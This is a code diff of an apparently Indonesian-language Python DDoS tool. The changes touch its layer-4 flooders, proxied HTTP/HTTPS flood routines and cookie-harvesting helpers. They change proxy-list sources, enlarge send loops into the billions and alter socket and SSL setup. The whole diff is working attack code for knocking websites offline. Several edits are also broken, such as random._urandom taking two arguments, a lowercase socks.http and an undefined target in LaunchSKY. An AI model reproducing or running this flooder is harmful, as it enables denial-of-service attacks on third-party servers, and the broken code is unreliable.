@@ -12,7 +12,7 @@ def countdown(t):
     while True:
         if (until - datetime.datetime.now()).total_seconds() > 0:
             stdout.flush()
-            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" PERMINTAAN DDOS ATTACK STATUS => " + str((until - datetime.datetime.now()).total_seconds()) + " TERKIRIM ")
+            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" PERMINTAAN  SERANGAN  DDOS ATTACK STATUS => " + str((until - datetime.datetime.now()).total_seconds()) + " TERKIRIM ")
         else:
             stdout.flush()
             stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" PERMINTAAN SELESAI =\n "+Fore.MAGENTA+"[*]"+Fore.WHITE+" STATUS PENGIRIMAN DI MULAI....                               \n")
@@ -36,13 +36,13 @@ def get_target(url):
 
 def get_proxylist(type):
     if type == "SOCKS5":
-        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all").text
+        r = requests.get("https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt").text
         r += requests.get("https://www.proxy-list.download/api/v1/get?type=socks5").text
         open("resources/socks5.txt", 'w').write(r)
         r = r.rstrip().split('\r\n')
         return r
     elif type == "HTTP":
-        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all").text
+        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all").text
         r += requests.get("https://www.proxy-list.download/api/v1/get?type=http").text
         open("resources/http.txt", 'w').write(r)
         r = r.rstrip().split('\r\n')
@@ -69,7 +69,7 @@ def get_cookie(url):
     driver = webdriver.Chrome(options=options)
     driver.implicitly_wait(3)
     driver.get(url)
-    for _ in range(6000000):
+    for _ in range(1111111111, 9999999999):
         cookies = driver.get_cookies()
         tryy = 0
         for i in cookies:
@@ -128,7 +128,7 @@ def get_info_l4():
 #region layer4
 def runflooder(host, port, th, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
-    rand = random._urandom(6000000)
+    rand = random._urandom(1024, 60000)
     for _ in range(int(th)):
         try:
             thd = threading.Thread(target=flooder, args=(host, port, rand, until))
@@ -148,7 +148,7 @@ def flooder(host, port, rand, until_datetime):
 
 def runsender(host, port, th, t, payload):
     if payload == "":
-        payload = random._urandom(6000000)
+        payload = random._urandom(1024, 60000)
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     #payload = Payloads[method]
     for _ in range(int(th)):
@@ -285,17 +285,18 @@ def AttackPXSOC(target, until_datetime, req):
             proxy = random.choice(list(proxies)).split(":")
             if target['scheme'] == 'https':
                 s = socks.socksocket()
+               # ctx = ssl.SSLContext()
                 s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                 s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
                 s.connect((str(target['host']), int(target['port'])))
-                s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
+                s = ssl.SSLContext().wrap_socket(s, server_hostname=target['host'])
             else:
                 s = socks.socksocket()
                 s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                 s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
                 s.connect((str(target['host']), int(target['port'])))
             try:
-                for _ in range(60000000):
+                for _ in range(1111111111, 9999999999):
                     s.send(str.encode(req))
             except:
                 s.close()
@@ -331,7 +332,7 @@ def AttackSOC(target, until_datetime, req):
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
             try:
-                for _ in range(6000000):
+                for _ in range(1111111111, 9999999999):
                     s.send(str.encode(req))
             except:
                 s.close()
@@ -362,7 +363,7 @@ def AttackPPS(target, until_datetime): #
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
             try:
-                for _ in range(6000000):
+                for _ in range(1111111111, 9999999999):
                     s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
             except:
                 s.close()
@@ -396,7 +397,7 @@ def AttackNULL(target, until_datetime, req): #
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
             try:
-                for _ in range(6000000):
+                for _ in range(1111111111, 9999999999):
                     s.send(str.encode(req))
             except:
                 s.close()
@@ -431,7 +432,7 @@ def AttackSPOOF(target, until_datetime, req): #
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
             try:
-                for _ in range(6000000):
+                for _ in range(1111111111, 9999999999):
                     s.send(str.encode(req))
             except:
                 s.close()
@@ -460,21 +461,23 @@ def AttackPXSPOOF(target, until_datetime, req, proxy): #
     try:
         if target['scheme'] == 'https':
             s = socks.socksocket()
-            #s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
             s.connect((str(target['host']), int(target['port'])))
+            ctx = ssl.SSLContext()
             s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
         else:
             s = socks.socksocket()
-            #s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+            ctx = ssl.SSLContext()
             s.connect((str(target['host']), int(target['port'])))
     except:
         return
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
             try:
-                for _ in range(6000000):
+                for _ in range(1111111111, 9999999999):
                     s.send(str.encode(req))
             except:
                 s.close()
@@ -602,13 +605,13 @@ def AttackCFSOC(until_datetime, target, req):
         packet.connect((str(target['host']), int(target['port'])))
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
-            for _ in range(6000000):
+            for _ in range(1111111111, 9999999999):
                 packet.send(str.encode(req))
         except:
             pass
 #endregion
 
-#region sky
+#region pxsky
 def attackSKY(url, timer, threads):
     for i in range(int(threads)):
         threading.Thread(target=LaunchSKY, args=(url, timer)).start()
@@ -630,19 +633,21 @@ def LaunchSKY(url, timer):
         try:
             s = socks.socksocket()
             s.connect((str(urlparse(url).netloc), int(443)))
-            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+            s.set_proxy(socks.http, str(proxy[0]), int(proxy[1]))
+            s.connect((str(target['host']), int(target['port'])))
             ctx = ssl.SSLContext()
             s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
             s.send(str.encode(req))
             try:
-                for _ in range(6000000):
+                for _ in range(1111111111, 9999999999):
                     s.send(str.encode(req))
                     s.send(str.encode(req))
             except:
                 pass
         except:
             s.close()
-
+#endregion           
+#sky
 def attackSTELLAR(url, timer, threads):
     for i in range(int(threads)):
         threading.Thread(target=LaunchSTELLAR, args=(url, timer)).start()
@@ -667,7 +672,7 @@ def LaunchSTELLAR(url, timer):
             s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
             s.send(str.encode(req))
             try:
-                for _ in range(6000000):
+                for _ in range(1111111111, 9999999999):
                     s.send(str.encode(req))
                     s.send(str.encode(req))
             except:
@@ -675,7 +680,7 @@ def LaunchSTELLAR(url, timer):
         except:
             s.close()
 #endregion
-
+#http2
 def LaunchHTTP2(url, th, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     for _ in range(int(th)):
@@ -778,7 +783,7 @@ def test2(until_datetime, target, req):
         packet.connect((str(target['host']), int(target['port'])))
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
-            for _ in range(6000000):
+            for _ in range(1111111111, 9999999999):
                 packet.send(str.encode(req))
         except:
             packet.close()
@@ -809,14 +814,14 @@ def help():
     stdout.write("             "+Fore.LIGHTCYAN_EX            +"╠═════════════════════════════════════════════════════╣\n")
     stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"THANK    "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Thanks for using DOS.                "+Fore.LIGHTCYAN_EX+"║\n")
     stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"YOU♥     "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Plz star project :)                    "+Fore.LIGHTCYAN_EX+"║\n")
-    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"github   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" github.com/Ro0TN3T/dos               "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"github   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" github.com/Ro0TN3T/dos       "+Fore.LIGHTCYAN_EX+"║\n")
     stdout.write("             "+Fore.LIGHTCYAN_EX            +"╚═════════════════════════════════════════════════════╝\n")
     stdout.write("\n")
 ##############################################################################################
 def credit():
     stdout.write("\x1b[38;2;0;236;250m════════════════════════╗\n")
     stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"Developer "+Fore.RED+": \x1b[38;2;0;255;189mHyuk\n")
-    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"UI Design "+Fore.RED+": \x1b[38;2;0;255;189mRo0T_N3T\n")
+    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"UI Design "+Fore.RED+": \x1b[38;2;0;255;189mYone不\n")
     stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   +"Methods/Tools "+Fore.RED+": \x1b[38;2;0;255;189mSkyWtkh\n")
     stdout.write("\x1b[38;2;0;236;250m════════════════════════╝\n")
     stdout.write("\n")    
